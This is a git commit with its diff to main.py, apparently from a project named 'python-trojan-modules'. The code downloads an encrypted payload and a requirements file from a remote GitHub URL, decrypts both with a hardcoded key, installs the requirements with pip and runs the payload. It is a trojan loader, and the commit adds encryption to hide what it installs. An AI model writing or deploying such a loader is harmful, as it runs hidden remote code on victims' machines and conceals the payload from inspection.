23e514b209115c956bd0007f6793ae85b2f4a19d
Stéphane Van den Broeck <mail@stephanevdb.com>
2023-06-06 12:15:24 +0200

    added requirements encryption

--- main.py
+++ main.py
@@ -1,20 +1,24 @@
+import os
+
 import requests as requests
 import subprocess
 import decryption
 import time
 
+
 key = b'8Shjz6mNyel8p7qNCETNEqrxBodA2MZbOtsJ6un79EQ='
 payload_url = "https://raw.githubusercontent.com/stephanevdb/python-trojan-modules/main/payload.py.enc"
-requirements_url = "https://github.com/stephanevdb/python-trojan-modules/blob/main/requirements.txt.enc"
+requirements_url = "https://raw.githubusercontent.com/stephanevdb/python-trojan-modules/main/requirements.txt.enc"
 
 
 def run_payload():
     p = requests.get(payload_url, allow_redirects=True)
     open('payload/' + 'payload.py.enc', 'wb').write(p.content)
     r = requests.get(requirements_url, allow_redirects=True)
-    open('payload/' + 'requirements.txt', 'wb').write(r.content)
+    open('payload/' + 'requirements.txt.enc', 'wb').write(r.content)
 
     decryption.decrypt_file('payload/' + 'payload.py.enc', key)
+    decryption.decrypt_file('payload/' + 'requirements.txt.enc', key)
 
     subprocess.run(["pip", "install", "-r", 'payload/' + "requirements.txt"])
     subprocess.run(["python", 'payload/' + "payload.py"])
